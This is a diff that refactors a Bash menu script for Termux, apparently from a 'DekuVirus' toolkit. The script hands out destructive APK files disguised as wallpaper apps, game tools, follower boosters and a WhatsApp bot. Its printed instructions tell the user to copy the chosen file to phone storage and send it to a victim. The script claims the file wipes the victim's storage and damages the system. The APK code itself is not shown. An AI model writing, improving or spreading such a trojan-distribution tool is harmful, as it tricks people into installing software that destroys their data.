@@ -7,7 +7,6 @@ figlet "Virus 2.3"
 echo -e "\e[31m"
 echo -e "\e[1m\e[35m¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥\e[21m"
 echo " "
-
 echo -e "\e[31m VIRUS APPLICATIONS ( New 2021 ! ) "|pv -qL 20
 echo -e "\e[96m___________________________________"
 echo " "
@@ -29,287 +28,64 @@ echo -e "\e[36m "
 read -p "CHOOSSE AN OPTION : " optionapp
 echo " "
 
-if [ $optionapp -eq 1 ]
-then 
-echo -e "\e[32m~Downloading "Nature HD Wallpapers" Virus Application "|pv -qL 20
-sleep 1
-echo -e "\e[94m"
-cd •
-cp Nature_hd_walpapers. ..
-cd ..
-mv Nature_hd_walpapers. Nature_hd_walpapers.apk
+function process_app() {
+  local filename="$1"
+  echo -e "\e[32m~Downloading \"$filename\" Virus Application "|pv -qL 20
+  sleep 1
+  echo -e "\e[94m"
+  cd files
+  cp "$filename." ..
+  cd ..
+  mv "$filename." "$filename.apk"
+  echo "••••••••••••••••••100%"|pv -qL 10
+  echo " "
+  sleep 1
+  echo -e "\e[92m$filename.apk File Downloaded Successfully"
+  echo " "
+  sleep 1
+  echo -e "\e[96mNow Type :- cp $filename.apk /sdcard "
+  echo -e "\e[96mTo COPY The Tvirus App File To "
+  echo -e "\e[96mYour INTERNAL STORAGE "
+  echo -e "\e[96mWhen Anyone Install This Application"
+  echo -e "\e[96mTheir Phone Will Be Damaged !"
+  echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
+  echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
+  echo -e "\e[96mSend This File To Victim!"
+}
 
-echo "••••••••••••••••••100%"|pv -qL 10
-echo " "
-sleep 1
-echo -e "\e[92mNature_hd_walpapers.apk File Downloaded Successfully"
-echo " "
-sleep 1
-echo -e "\e[96mNow Type :- cp Nature_hd_walpapers.apk /sdcard "
-echo -e "\e[96mTo COPY The Tvirus App File To "
-echo -e "\e[96mYour INTERNAL STORAGE "
-echo -e "\e[96mWhen Anyone Install This Application"
-echo -e "\e[96mTheir Phone Will Be Damaged !"
-echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
-echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
-echo -e "\e[96mSend This File To Victim!"
-elif [ $optionapp -eq 2 ]
-then
-echo -e "\e[32m~Downloading "Termux Pro" Virus Application "|pv -qL 20
-sleep 1
-echo -e "\e[94m"
-cd •
-cp Termux_pro. ..
-cd ..
-mv Termux_pro. Termux_pro.apk
+case "$optionapp" in
+  1) process_app "Nature_hd_walpapers";;
+  2) process_app "Termux_pro";;
+  3) process_app "Ff_lag_fixer";;
+  4) process_app "Text_now_pro";;
+  5) process_app "Insta_f_and_l";;
+  6) process_app "Pubg_gfx_tool";;
+  7) process_app "Settings_pro";;
+  8) process_app "Play_store_pro";;
+  9) process_app "Ff_diamond_file";;
+ 10) process_app "Auto_bot_for_whatsapp";;
+ *)
+    echo " "
+    echo -e "\e[95m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
+    echo "•••Sorry Please choose Correct OPTION•••"
+    echo -e "\e[95m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
+    ;;
+esac
 
-echo "••••••••••••••••••100%"|pv -qL 10
-
-echo " "
-sleep 1
-echo -e "\e[96mNow Type :- cp Termux_pro.apk /sdcard "
-echo -e "\e[96mTo COPY The Tvirus App File To "
-echo -e "\e[96mYour INTERNAL STORAGE "
-echo -e "\e[96mWhen Anyone Install This Application"
-echo -e "\e[96mTheir Phone Will Be Damaged !"
-echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
-echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
-echo -e "\e[96mSend This File To Victim!"
-
-elif [ $optionapp -eq 3 ]
-then
-echo -e "\e[32m~Downloading "FF Lag Fixer" Virus Application "|pv -qL 20
-sleep 1
-echo -e "\e[94m"
-cd •
-cp Ff_lag_fixer. ..
-cd ..
-mv Ff_lag_fixer. Ff_lag_fixer.apk
-
-echo "••••••••••••••••••100%"|pv -qL 10
-
-echo " "
-sleep 1
-echo -e "\e[92mFf_lag_fixer.apk File Downloaded Successfully"
-echo " "
-sleep 1
-echo -e "\e[96mNow Type :- cp Ff_lag_fixer.apk /sdcard "
-echo -e "\e[96mTo COPY The Tvirus App File To "
-echo -e "\e[96mYour INTERNAL STORAGE "
-echo -e "\e[96mWhen Anyone Install This Application"
-echo -e "\e[96mTheir Phone Will Be Damaged !"
-echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
-echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
-echo -e "\e[96mSend This File To Victim!"
-elif [ $optionapp -eq 4 ]
-then
-echo -e "\e[32m~Downloading "Text Now Pro" Virus Application "|pv -qL 20
-sleep 1
-echo -e "\e[94m"
-cd •
-cp Text_now_pro. ..
-cd ..
-mv Text_now_pro. Text_now_pro.apk
-
-echo "••••••••••••••••••100%"|pv -qL 10
-
-echo " "
-sleep 1
-echo -e "\e[96mNow Type :- cp Text_now_pro.apk /sdcard "
-echo -e "\e[96mTo COPY The Tvirus App File To "
-echo -e "\e[96mYour INTERNAL STORAGE "
-echo -e "\e[96mWhen Anyone Install This Application"
-echo -e "\e[96mTheir Phone Will Be Damaged !"
-echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
-echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
-echo -e "\e[96mSend This File To Victim!"
-elif [ $optionapp -eq 5 ]
-then
-echo -e "\e[32m~Downloading Insta Follow & Like Virus Application "|pv -qL 20
-sleep 1
-echo -e "\e[94m"
-cd •
-cp Insta_f_and_l. ..
-cd ..
-mv Insta_f_and_l. Insta_f_and_l.apk
-
-echo "••••••••••••••••••100%"|pv -qL 10
-
-echo " "
-sleep 1
-echo -e "\e[92mInsta_f_and_l.apk File Downloaded Successfully"
-echo " "
-sleep 1
-echo -e "\e[96mNow Type :- cp Insta_f_and_l.apk /sdcard "
-echo -e "\e[96mTo COPY The Tvirus App File To "
-echo -e "\e[96mYour INTERNAL STORAGE "
-echo -e "\e[96mWhen Anyone Install This Application"
-echo -e "\e[96mTheir Phone Will Be Damaged !"
-echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
-echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
-echo -e "\e[96mSend This File To Victim!"
-elif [ $optionapp -eq 6 ]
-then
-echo -e "\e[32m~Downloading Pubg GFX Tool Virus Application."|pv -qL 20
-sleep 1
-echo -e "\e[94m"
-cd •
-cp Pubg_gfx_tool. ..
-cd ..
-mv Pubg_gfx_tool. Pubg_gfx_tool.apk
-
-echo "••••••••••••••••••100%"|pv -qL 10
-
-echo " "
-sleep 1
-echo -e "\e[92mPubg_gfx_tool.apk File Downloaded Successfully"
-echo " "
-sleep 1
-echo -e "\e[96mNow Type :- cp Pubg_gfx_tool.apk /sdcard "
-echo -e "\e[96mTo COPY The Tvirus App File To "
-echo -e "\e[96mYour INTERNAL STORAGE "
-echo -e "\e[96mWhen Anyone Install This Application"
-echo -e "\e[96mTheir Phone Will Be Damaged !"
-echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
-echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
-echo -e "\e[96mSend This File To Victim!"
-elif [ $optionapp -eq 7 ]
-then
-echo -e "\e[32m~Downloading Settings Pro Virus Application"|pv -qL 20
-sleep 1
-echo -e "\e[94m"
-cd •
-cp Settings_pro. ..
-cd ..
-mv Settings_pro. Settings_pro.apk
-
-echo "••••••••••••••••••100%"|pv -qL 10
-
-echo " "
-sleep 1
-echo -e "\e[92mSettings_pro.apk File Downloaded Successfully"
-echo " "
-sleep 1
-echo -e "\e[96mNow Type :- cp Settings_pro.apk /sdcard "
-echo -e "\e[96mTo COPY The Tvirus App File To "
-echo -e "\e[96mYour INTERNAL STORAGE "
-echo -e "\e[96mWhen Anyone Install This Application"
-echo -e "\e[96mTheir Phone Will Be Damaged !"
-echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
-echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
-echo -e "\e[96mSend This File To Victim!"
-elif [ $optionapp -eq 8 ]
-then
-echo -e "\e[32m~Downloading Play Store Pro Virus Application"|pv -qL 20
-sleep 1
-echo -e "\e[94m"
-cd •
-cp Play_store_pro. ..
-cd ..
-mv Play_store_pro. Play_store_pro.apk
-
-echo "••••••••••••••••••100%"|pv -qL 10
-
-echo " "
-sleep 1
-echo -e "\e[92mPlay_store_pro.apk File Downloaded Successfully"
-echo " "
-sleep 1
-echo -e "\e[96mNow Type :- cp Play_store_pro. /sdcard "
-echo -e "\e[96mTo COPY The Tvirus App File To "
-echo -e "\e[96mYour INTERNAL STORAGE "
-echo -e "\e[96mWhen Anyone Install This Application"
-echo -e "\e[96mTheir Phone Will Be Damaged !"
-echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
-echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
-echo -e "\e[96mSend This File To Victim!"
-elif [ $optionapp -eq 9 ]
-then
-echo -e "\e[32m~Downloading FF Diamond File Virus Application"|pv -qL 20
-sleep 1
-echo -e "\e[94m"
-cd •
-cp Ff_diamond_file. ..
-cd ..
-mv Ff_diamond_file. Ff_diamond_file.apk
-
-echo "••••••••••••••••••100%"|pv -qL 10
-
-echo " "
-sleep 1
-echo -e "\e[92mFf_diamond_file.apk File Downloaded Successfully"
-echo " "
-sleep 1
-echo -e "\e[96mNow Type :- cp Ff_diamond_file.apk /sdcard "
-echo -e "\e[96mTo COPY The Tvirus App File To "
-echo -e "\e[96mYour INTERNAL STORAGE "
-echo -e "\e[96mWhen Anyone Install This Application"
-echo -e "\e[96mTheir Phone Will Be Damaged !"
-echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
-echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
-echo -e "\e[96mSend This File To Victim!"
-elif [ $optionapp -eq 10 ]
-then
-echo -e "\e[32m~Downloading Auto BOT For Whatsapp Virus Application"|pv -qL 20
-sleep 1
-echo -e "\e[94m"
-cd •
-cp Auto_bot_for_whatsapp. ..
-cd ..
-mv Auto_bot_for_whatsapp. Auto_bot_for_whatsapp.apk
-
-echo "••••••••••••••••••100%"|pv -qL 10
-
-echo " "
-sleep 1
-echo -e "\e[92mAuto_bot_for_whatsapp.apk File Downloaded Successfully"
-echo " "
-sleep 1
-echo -e "\e[96mNow Type :- cp Auto_bot_for_whatsapp.apk /sdcard "
-echo -e "\e[96mTo COPY The Tvirus App File To "
-echo -e "\e[96mYour INTERNAL STORAGE "
-echo -e "\e[96mWhen Anyone Install This Application"
-echo -e "\e[96mTheir Phone Will Be Damaged !"
-echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
-echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
-echo -e "\e[96mSend This File To Victim!"
-              
-else 
-echo " "
-echo -e "\e[95m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
-echo "•••Sorry Please choose Correct OPTION•••"
-echo -e "\e[95m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
-fi
 echo " "
 echo -e "\e[92m========================================== "
 echo -e "\e[93m[1] To Go Back"
 echo -e "\e[93m[2] To Go Home"
 echo -e "\e[93m[3] To Exit "
-
 echo -e "\e[92m "
 read -p "CHOOSE AN OPTION : " be 
-if [ $be -eq 1 ]
-then
-bash app.sh
-elif [ $be -eq 2 ]
-then
-bash DekuVirus.sh
-echo -e "\e[39m"
-else
-echo -e "\e[39m"
+if [ "$be" -eq 1 ]; then
+  bash "$0"
+elif [ "$be" -eq 2 ]; then
+  bash DekuVirus.sh
 fi
+
 echo -e "\e[95m÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷"
 echo -e "\e[103m     •••FOR MORE DETAILS•••. "
 echo -e "\e[103mSEARCH *The Deku Virus*"
 echo -e "\e[103m       •••ON YOUTUBE•••      \e[49m"
-echo -e " \e[39m"
-echo -e "\e[95m÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷"
-echo -e "\e[39m"
-
-
-
-
-
-
-
-
